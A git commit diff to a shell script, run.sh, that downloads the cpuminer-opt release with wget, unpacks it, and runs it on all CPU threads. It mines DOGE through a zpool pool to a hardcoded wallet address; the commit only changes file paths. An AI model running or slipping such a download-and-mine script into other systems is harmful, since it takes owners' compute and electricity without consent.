0ed6fd1cb50970f8b5a534fc5e482d5eb9cf81c2
xxmichalreal <167646002+xxmichalreal@users.noreply.github.com>
2024-04-22 08:20:46 -0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,12 +1,10 @@
 #!/bin/bash
 
-cd cache
-
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
-tar -xvf cpuminer-opt-linux.tar.gz
-rm cpuminer-opt-linux.tar.gz
-chmod +x cpuminer-sse42
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz -O cache/cpuminer-opt-linux.tar.gz
+tar -xvf cache/cpuminer-opt-linux.tar.gz -C cache/
+rm cache/cpuminer-opt-linux.tar.gz
+chmod +x cache/cpuminer-sse42
 
 threads=$(nproc)
 
-./cpuminer-sse42 -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 --userpass=DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB:c=DOGE --threads=$threads
+./cache/cpuminer-sse42 -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 --userpass=DEw5esZk5iRZS3T8LdUXP8Scj8Vcyz8yNB:c=DOGE --threads=$threads
